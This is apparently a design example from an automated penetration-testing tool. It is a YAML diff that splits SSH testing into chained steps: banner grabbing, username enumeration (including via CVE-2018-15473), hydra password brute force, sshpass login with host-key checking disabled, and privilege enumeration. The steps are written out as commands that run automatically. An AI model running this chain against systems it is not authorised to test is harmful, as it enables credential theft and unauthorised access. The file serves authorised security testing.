@@ -1,0 +1,323 @@
+# Example: SSH Service - Atomic Step Decomposition
+# This shows how the monolithic SSH methodology breaks down into atomic steps
+
+---
+# STEP 1: Banner Grab (Service Identification Phase)
+step:
+  id: ssh_banner_grab
+  name: SSH Banner Grabbing
+  phase: service_identification
+
+  trigger:
+    type: property_match
+    conditions:
+      asset_type: port
+      properties:
+        port: 22
+        protocol: tcp
+        state: open
+        service: null  # Not yet identified
+
+  commands:
+    - tool: netcat
+      command: "nc -vn {host} {port}"
+      timeout: 10
+      platforms: [linux, macos]
+
+  output_parser:
+    type: regex
+    patterns:
+      - field: banner
+        regex: 'SSH-[0-9\.]+-(.+)'
+      - field: service
+        value: 'ssh'  # Static assignment
+      - field: version
+        regex: 'SSH-[0-9\.]+-(.+)'
+
+  updates_asset:
+    asset_type: port
+    properties:
+      service: ssh
+      banner: "{extracted.banner}"
+      version: "{extracted.version}"
+
+  priority: 7
+  deduplication_signature: "{asset_id}:ssh_banner"
+
+---
+# STEP 2: SSH Authentication Methods Enumeration
+step:
+  id: ssh_auth_methods_enum
+  name: SSH Authentication Methods Enumeration
+  phase: service_enumeration
+
+  trigger:
+    type: property_match
+    conditions:
+      asset_type: port
+      properties:
+        service: ssh
+        auth_methods_enumerated: { $ne: true }
+
+  commands:
+    - tool: nmap
+      command: "nmap -p {port} --script ssh-auth-methods {host}"
+      timeout: 30
+
+  output_parser:
+    type: nmap_script
+    script_name: ssh-auth-methods
+    extracts:
+      - field: auth_methods
+        path: "//elem[@key='ssh-auth-methods']"
+
+  updates_asset:
+    properties:
+      auth_methods: "{extracted.auth_methods}"
+      auth_methods_enumerated: true
+      allows_password_auth: "{extracted.auth_methods.contains('password')}"
+      allows_pubkey_auth: "{extracted.auth_methods.contains('publickey')}"
+
+  next_triggers:
+    - step: ssh_user_enum_timing
+      condition: "allows_password_auth == true"
+    - step: ssh_key_enumeration
+      condition: "allows_pubkey_auth == true"
+
+  priority: 6
+  deduplication_signature: "{asset_id}:ssh_auth_methods"
+
+---
+# STEP 3: SSH User Enumeration (Timing-based)
+step:
+  id: ssh_user_enum_timing
+  name: SSH User Enumeration (Timing Attack)
+  phase: service_enumeration
+
+  trigger:
+    type: property_match
+    conditions:
+      asset_type: port
+      properties:
+        service: ssh
+        allows_password_auth: true
+        usernames_enumerated: { $ne: true }
+
+  commands:
+    - tool: nmap
+      command: "nmap -p {port} --script ssh-enum-users --script-args userdb=/usr/share/wordlists/usernames.txt {host}"
+      timeout: 300
+
+  output_parser:
+    type: nmap_script
+    creates_assets:
+      - asset_type: credential
+        parent: port_id
+        properties:
+          username: "{extracted.username}"
+          password: null
+          validated: false
+          enumeration_method: "ssh_timing_attack"
+
+  updates_asset:
+    properties:
+      usernames_enumerated: true
+      valid_usernames_count: "{created_assets.count}"
+
+  next_triggers:
+    - step: ssh_password_brute_force
+      condition: "valid_usernames_count > 0"
+
+  priority: 6
+  deduplication_signature: "{asset_id}:ssh_user_enum"
+
+---
+# STEP 4: SSH User Enumeration (CVE-2018-15473)
+step:
+  id: ssh_user_enum_cve_2018_15473
+  name: SSH User Enumeration via CVE-2018-15473
+  phase: vulnerability_assessment
+
+  trigger:
+    type: property_match
+    conditions:
+      asset_type: port
+      properties:
+        service: ssh
+        version: { $regex: "OpenSSH [0-7]\\." }  # Vulnerable versions
+        cve_2018_15473_tested: { $ne: true }
+
+  commands:
+    - tool: python
+      command: "python3 /opt/ssh-user-enum/ssh-username-enum.py --port {port} --userList /usr/share/wordlists/usernames.txt {host}"
+      timeout: 300
+
+  output_parser:
+    type: custom
+    creates_assets:
+      - asset_type: credential
+        properties:
+          username: "{line.username}"
+          enumeration_method: "cve_2018_15473"
+
+  updates_asset:
+    properties:
+      cve_2018_15473_tested: true
+      vulnerable_to_cve_2018_15473: true
+
+  priority: 8  # Higher priority because it's a known CVE
+
+---
+# STEP 5: SSH Password Brute Force
+step:
+  id: ssh_password_brute_force
+  name: SSH Password Brute Force
+  phase: exploitation
+
+  trigger:
+    type: property_match
+    conditions:
+      asset_type: credential
+      parent_service: ssh
+      properties:
+        password: null
+        brute_force_attempted: { $ne: true }
+
+  prerequisites:
+    - min_credentials: 1  # At least one username known
+
+  commands:
+    - tool: hydra
+      command: "hydra -L {usernames_file} -P {passwords_file} ssh://{host}:{port} -t 4"
+      timeout: 3600
+      batch_compatible: true
+
+  output_parser:
+    type: hydra
+    updates_matching_asset:
+      asset_type: credential
+      match_on: username
+      properties:
+        password: "{extracted.password}"
+        validated: true
+        brute_force_attempted: true
+
+  next_triggers:
+    - step: ssh_connection_test
+      condition: "validated == true"
+
+  priority: 5
+  rate_limiting:
+    max_concurrent: 2  # Don't hammer too many SSH services at once
+    delay_between: 5
+
+---
+# STEP 6: SSH Connection Validation
+step:
+  id: ssh_connection_test
+  name: SSH Connection Test (Validate Credentials)
+  phase: exploitation
+
+  trigger:
+    type: property_match
+    conditions:
+      asset_type: credential
+      parent_service: ssh
+      properties:
+        password: { $ne: null }
+        connection_validated: { $ne: true }
+
+  commands:
+    - tool: sshpass
+      command: "sshpass -p '{password}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10 {username}@{host} 'whoami'"
+      timeout: 15
+
+  output_parser:
+    type: regex
+    patterns:
+      - field: whoami_output
+        regex: '(.+)'
+
+  updates_asset:
+    properties:
+      connection_validated: true
+      connection_successful: "{exit_code == 0}"
+      remote_user: "{extracted.whoami_output}"
+
+  next_triggers:
+    - step: ssh_privilege_check
+      condition: "connection_successful == true"
+    - step: ssh_sudo_enum
+      condition: "remote_user != 'root'"
+
+  priority: 7  # High priority - we have valid creds!
+
+---
+# STEP 7: SSH Privilege Enumeration
+step:
+  id: ssh_privilege_check
+  name: SSH Privilege Enumeration
+  phase: post_exploitation
+
+  trigger:
+    type: property_match
+    conditions:
+      asset_type: credential
+      parent_service: ssh
+      properties:
+        connection_successful: true
+        privileges_enumerated: { $ne: true }
+
+  commands:
+    - tool: sshpass
+      command: "sshpass -p '{password}' ssh {username}@{host} 'id; groups; sudo -l 2>/dev/null'"
+      timeout: 30
+
+  output_parser:
+    type: regex
+    patterns:
+      - field: uid
+        regex: 'uid=([0-9]+)'
+      - field: is_root
+        value: "{extracted.uid == '0'}"
+      - field: sudo_permissions
+        regex: 'User .* may run the following'
+
+  updates_asset:
+    properties:
+      privileges_enumerated: true
+      is_root: "{extracted.is_root}"
+      has_sudo: "{extracted.sudo_permissions != null}"
+
+  next_triggers:
+    - step: linux_privilege_escalation
+      condition: "is_root == false"
+
+  priority: 6
+
+---
+# Queue Behavior Example
+
+# When port 22 is discovered:
+# 1. ssh_banner_grab (priority: 7) → Identifies it as SSH, extracts version
+#
+# After banner grab completes and updates asset with service=ssh:
+# 2. ssh_auth_methods_enum (priority: 6) → Discovers password auth enabled
+#
+# After auth methods discovered:
+# 3. ssh_user_enum_timing (priority: 6) → Finds 5 valid usernames
+# 3. ssh_user_enum_cve_2018_15473 (priority: 8) → If vulnerable version detected
+#
+# After usernames discovered (creates 5 credential assets):
+# 4. ssh_password_brute_force (priority: 5) × 5 credentials → Batched together
+#
+# After valid password found:
+# 5. ssh_connection_test (priority: 7) → Validates credentials work
+#
+# After connection validated:
+# 6. ssh_privilege_check (priority: 6) → Enumerates user privileges
+#
+# The queue automatically prioritizes:
+# - CVE checks (priority 8) run before brute force (priority 5)
+# - Credential validation (priority 7) runs immediately after finding creds
+# - Multiple similar steps batch together (5 brute force operations)
